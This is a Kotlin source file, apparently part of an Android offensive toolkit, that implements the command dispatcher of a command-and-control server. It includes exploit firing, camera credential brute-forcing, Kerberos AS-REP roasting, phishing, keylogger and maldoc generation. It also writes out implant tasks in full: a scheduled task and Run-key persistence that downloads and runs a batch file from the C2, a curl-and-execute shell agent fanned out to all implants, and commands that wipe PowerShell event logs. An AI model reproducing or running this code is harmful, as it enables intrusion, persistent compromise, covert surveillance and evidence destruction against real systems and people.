package com.projectzerodays.quantumcli.c2

import com.projectzerodays.quantumcli.ops.Artifacts
import com.projectzerodays.quantumcli.ops.Brute
import com.projectzerodays.quantumcli.ops.CamWar
import com.projectzerodays.quantumcli.ops.CatalogSync
import com.projectzerodays.quantumcli.ops.ExploitDb
import com.projectzerodays.quantumcli.ops.Kerberos
import com.projectzerodays.quantumcli.ops.Net
import com.projectzerodays.quantumcli.ops.Overlord
import com.projectzerodays.quantumcli.ops.Phish
import com.projectzerodays.quantumcli.ops.QBrain
import com.projectzerodays.quantumcli.ops.Recon
import com.projectzerodays.quantumcli.ops.Weapons
import org.json.JSONArray
import org.json.JSONObject
import java.io.File

/**
 * QCLI_API parity — the POST /ai JSON command dispatcher. Every command maps
 * 1:1 to the Python C2's QCLI_API.handle plus the on-device control surface
 * (fire / scan / fingerprint / brute / phish / kitlogger / persistx /
 * footprint / camshot).
 */
class QcliApi {

    fun handle(cmd: String, params: JSONObject = JSONObject()): JSONObject {
        return try {
            when (cmd) {
                "", "status" -> status()
                "zerocheck" -> Weapons.zerocheck(requireIp(params))
                "fire" -> fire(params)
                "scan" -> scan(params)
                "fingerprint" -> fingerprint(params)
                "brute" -> Brute.run(
                    requireIp(params),
                    params.optString("service", "rtsp"),
                    mapOf(
                        "port" to params.optString("port", ""),
                        "path" to params.optString("path", "/"),
                        "domain" to params.optString("domain", "")
                    ).filterValues { it.isNotBlank() }
                )
                "rtspbrute" -> JSONObject()
                    .put("hits", JSONArray(Brute.rtspBrute(requireIp(params)).map { it.toString() }))
                "roast" -> JSONObject()
                    .put("hashes", JSONArray(Kerberos.asrepRoast(requireIp(params), params.optString("domain"))))
                    .put("note", "AS-REP hashes (hashcat -m 18200)")
                "phish" -> Phish.launch(
                    params.optString("target_email", params.optString("email", "operator@lab.local")),
                    params.optString("subject", "Payroll")
                )
                "camwar", "camdiscover" -> camwar(params)
                "mitre" -> MitreMapper.mapAudit(C2State.audit.value)
                "exploitdb" -> ExploitDb.search(
                    com.projectzerodays.quantumcli.QuantumApp.ctx,
                    params.optString("query", params.optString("q", "")),
                    params.optInt("limit", 25),
                )
                "exploitdb_stats" -> ExploitDb.stats(
                    com.projectzerodays.quantumcli.QuantumApp.ctx
                )
                "catalog_sync" -> JSONObject()
                    .put("result", CatalogSync.syncOnce(
                        com.projectzerodays.quantumcli.QuantumApp.ctx))
                "decide" -> QBrain.decide(
                    params.optJSONObject("state") ?: JSONObject(),
                    params.optJSONArray("acts")?.let { arr ->
                        List(arr.length()) { arr.optString(it) }
                    } ?: listOf("cam_war", "rest")
                )
                "plan" -> JSONObject().put(
                    "cve",
                    QBrain.planAttack(params.optJSONObject("recon") ?: JSONObject())
                )
                "kill" -> JSONObject().put(
                    "killed",
                    JSONArray(C2State.killAll(params.optBoolean("wipe", true)))
                )
                "flashfill" -> Artifacts.flashfill(
                    params.optDouble("stop_frac", 0.98),
                    params.optInt("max_files", 100_000)
                )
                "emojisms" -> Artifacts.emojisms(params.optString("text", "ping"))
                "macreset" -> Artifacts.macReset()
                "mshtmaldoc" -> Artifacts.mshtmlMaldoc(params.optString("ip", Net.localIp()))
                "kitlogger" -> Artifacts.kitlogger(
                    params.optString("host", "keylogger"),
                    c2HostPort()
                )
                "persistx" -> persistx(params)
                "footprint" -> footprint(params)
                "camshot" -> camshot(params)
                "ghostdns" -> ghostdns(params)
                "dohc2" -> dohc2(params)
                "foxacid" -> foxacid(params)
                "federation" -> federationCmd(params)
                else -> JSONObject().put("error", "unknown cmd: $cmd")
            }
        } catch (e: Exception) {
            JSONObject().put("error", e.message ?: e.javaClass.simpleName)
        }
    }

    fun c2HostPort(): String = "${Net.localIp()}:${QuantServerManager.boundPort}"

    private fun requireIp(params: JSONObject): String {
        val ip = params.optString("ip", "")
        if (ip.isBlank() || !Net.validIp(ip)) {
            throw IllegalArgumentException("valid 'ip' param required")
        }
        return ip
    }

    private fun status(): JSONObject = JSONObject()
        .put("ok", true)
        .put("version", C2State.VERSION)
        .put("implants", JSONObject(C2State.implants.value.mapValues {
            JSONObject().put("last_seen", it.value.lastSeen).put("beacons", it.value.beacons)
        }))

    private fun fire(params: JSONObject): JSONObject {
        val cve = params.optString("cve")
        if (cve.isBlank()) throw IllegalArgumentException("'cve' param required")
        return Weapons.fire(cve, requireIp(params), params.optJSONObject("params") ?: JSONObject())
    }

    private fun scan(params: JSONObject): JSONObject {
        val cidr = params.optString("cidr", Net.localScope())
        val hosts = Recon.scan(cidr)
        val arr = JSONArray()
        hosts.forEach { arr.put(JSONObject().put("ip", it.ip).put("ports", JSONArray(it.ports))) }
        C2State.audit("RECON", "recon scan $cidr: ${hosts.size} live host(s)")
        return JSONObject().put("cidr", cidr).put("hosts", arr)
    }

    private fun fingerprint(params: JSONObject): JSONObject {
        val ip = requireIp(params)
        val fp = Recon.fingerprint(ip)
        val verdict = Recon.validate(ip, fp)
        C2State.audit("RECON", "fingerprint $ip: ${fp.optJSONArray("ports")?.length() ?: 0} port(s), verdict ${verdict.optString("decision")}")
        return JSONObject().put("fingerprint", fp).put("validator", verdict)
    }

    private fun camwar(params: JSONObject): JSONObject {
        val cidr = params.optString("cidr", Net.localScope())
        val cams = CamWar.discover(cidr, bruteCreds = params.optBoolean("brute", true))
        C2State.setCameras(cams)
        val arr = JSONArray()
        cams.forEach {
            arr.put(
                JSONObject().put("ip", it.ip).put("vendor", it.vendor)
                    .put("ports", JSONArray(it.ports))
                    .put("source", it.source)
                    .put("creds", it.creds ?: JSONObject.NULL)
            )
        }
        return JSONObject().put("cidr", cidr).put("cams", arr)
    }

    private fun persistx(params: JSONObject): JSONObject {
        val host = params.optString("host", "")
        if (host.isBlank()) throw IllegalArgumentException("'host' param required")
        val c2 = c2HostPort()
        val task = JSONObject().put("act", "run").put(
            "cmd",
            "schtasks /create /tn \"qcli-svc\" /tr \"powershell -w hidden -c " +
                "iwr http://$c2/s/default -UseBasicParsing -OutFile %TEMP%\\a.bat; %TEMP%\\a.bat\" " +
                "/sc minute /mo 15 /f; reg add " +
                "\"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v qcli /t REG_SZ " +
                "/d \"powershell -w hidden -c iwr http://$c2/s/default -UseBasicParsing\" /f"
        )
        C2State.setTask(host, task)
        C2State.audit("C2", "PERSISTX staged for $host (schtasks + run key)")
        return JSONObject().put("staged", true).put("host", host)
    }

    private fun footprint(params: JSONObject): JSONObject {
        val host = params.optString("host", "")
        if (host.isNotBlank()) {
            val task = JSONObject().put("act", "run").put(
                "cmd",
                "powershell -NoProfile -Command \"wevtutil cl 'Windows PowerShell'; " +
                    "Remove-Item ${'$'}env:TEMP\\lakitu*,${'$'}env:TEMP\\a.bat,${'$'}env:TEMP\\kl.klq " +
                    "-ErrorAction SilentlyContinue\""
            )
            C2State.setTask(host, task)
            C2State.audit("OPSEC", "FOOTPRINT wipe task queued for $host")
            return JSONObject().put("queued", host)
        }
        var n = 0
        C2State.qcliDir.listFiles()?.forEach {
            if (it.isFile) {
                it.delete(); n++
            }
        }
        C2State.audit("OPSEC", "FOOTPRINT local: $n staged artifact(s) removed")
        return JSONObject().put("removed", n)
    }

    private fun camshot(params: JSONObject): JSONObject {
        val ip = requireIp(params)
        val vendor = params.optString("vendor", "generic")
        val shot = CamWar.snapshot(ip, vendor, params.optString("creds").ifBlank { null })
            ?: return JSONObject().put("error", "no snapshot from $ip")
        val dir = File(C2State.lootDir, ip).apply { mkdirs() }
        val f = File(dir, "camshot_${System.currentTimeMillis() / 1000}.jpg")
        f.writeBytes(shot)
        val sealed = Grayfish.seal(f)
        C2State.recordLoot(ip, sealed, "camshot", shot.size)
        C2State.audit("CAM", "camshot $ip -> ${sealed.name}")
        return JSONObject().put("sealed", sealed.name).put("bytes", shot.size)
    }

    // ---------------------------------------------------------------- ghostdns
    /**
     * GHOSTFANG-DNS — stage the DoH-egress agent and task implant(s) to pull
     * it from /s/ghostdns (persistx-style task shape). Requires the
     * operator-controlled 'domain'. When 'host' is blank the task fans out to
     * every registered implant. Also runs a live doh_task_check against the
     * operator's DNS TXT records (Python doh_task_check parity).
     */
    private fun ghostdns(params: JSONObject): JSONObject {
        val domain = params.optString("domain", "").trim()
        if (domain.isBlank()) {
            throw IllegalArgumentException(
                "'domain' param required (operator-controlled DNS zone for DoH egress)"
            )
        }
        val host = params.optString("host", "").trim()
        val c2 = c2HostPort()
        // Stage the domain-flavored agent (Python generate_dns_agent parity).
        val fn = File(C2State.qcliDir, "ghostdns.sh")
        fn.writeText(Agents.ghostdnsSh(domain))
        fn.setExecutable(true, false)
        val task = JSONObject().put("act", "run").put(
            "cmd",
            "curl -s \"http://$c2/s/ghostdns?domain=$domain\" -o /var/tmp/.gn-qcli.sh; " +
                "(sh /var/tmp/.gn-qcli.sh >/dev/null 2>&1 &)"
        )
        if (host.isBlank()) {
            C2State.setTaskAll { task }
            C2State.audit("C2", "GHOSTFANG-DNS staged for ALL implants (domain $domain)")
        } else {
            C2State.setTask(host, task)
            C2State.audit("C2", "GHOSTFANG-DNS staged for $host (domain $domain)")
        }
        return JSONObject()
            .put("staged", true)
            .put("host", host.ifBlank { "*" })
            .put("domain", domain)
            .put("agent", fn.absolutePath)
            .put("task_check", dohTaskCheck(domain, params.optString("host_id", "hq")) ?: JSONObject.NULL)
    }

    /** doh_task_check parity — read the next task from DNS TXT records. */
    private fun dohTaskCheck(domain: String, hostId: String): JSONObject? {
        return try {
            for (name in listOf("$hostId.cmd.$domain", "cmd.$domain")) {
                val r = Net.httpGet(
                    "https://dns.google/resolve?name=$name&type=TXT",
                    mapOf("accept" to "application/dns-json"),
                    timeoutMs = 4000
                )
                if (!r.ok) continue
                val answers = JSONObject(r.text()).optJSONArray("Answer") ?: continue
                for (i in 0 until answers.length()) {
                    val raw = answers.optJSONObject(i)?.optString("data")?.trim('"') ?: continue
                    if (raw.startsWith("{")) return JSONObject(raw)
                }
            }
            null
        } catch (e: Exception) {
            null
        }
    }

    // ------------------------------------------------------------------ dohc2
    /** DoH TXT beacon listener (POST /t stages, GET /?d=<id> fetch-and-clear). */
    private fun dohc2(params: JSONObject): JSONObject {
        return when (params.optString("action", "start").lowercase()) {
            "start" -> {
                val port = params.optInt("port", 5353)
                if (!DoHC2.start(port)) {
                    throw IllegalStateException("DoH beacon listener bind :$port failed")
                }
                DoHC2.status()
            }
            "stop" -> {
                DoHC2.stop()
                DoHC2.status()
            }
            else -> throw IllegalArgumentException("'action' must be 'start' or 'stop'")
        }
    }

    // ---------------------------------------------------------------- foxacid
    /** FOXACID exploit-server lifecycle (:8081 maldoc + /f staged payloads). */
    private fun foxacid(params: JSONObject): JSONObject {
        return when (params.optString("action", "start").lowercase()) {
            "start" -> {
                val port = params.optInt("port", 8081)
                if (!FoxAcid.start(port)) {
                    throw IllegalStateException("FOXACID bind :$port failed")
                }
                FoxAcid.status()
            }
            "stop" -> {
                FoxAcid.stop()
                FoxAcid.status()
            }
            else -> throw IllegalArgumentException("'action' must be 'start' or 'stop'")
        }
    }

    // ------------------------------------------------------------- federation
    /** Mesh status {identity, peers} — or merge a peer with {peer: id}. */
    private fun federationCmd(params: JSONObject): JSONObject {
        val peer = params.optString("peer", "").ifBlank { params.optString("onion", "") }.trim()
        if (peer.isNotBlank()) {
            val merged = Federation.addPeer(
                JSONObject().put("id", peer).put("url", params.optString("url", ""))
            )
            return JSONObject().put("merged", merged)
        }
        return JSONObject()
            .put("identity", Federation.identity())
            .put("peers", Federation.peers())
    }

    companion object {
        val ACTS = Overlord.ACTIONS
    }
}
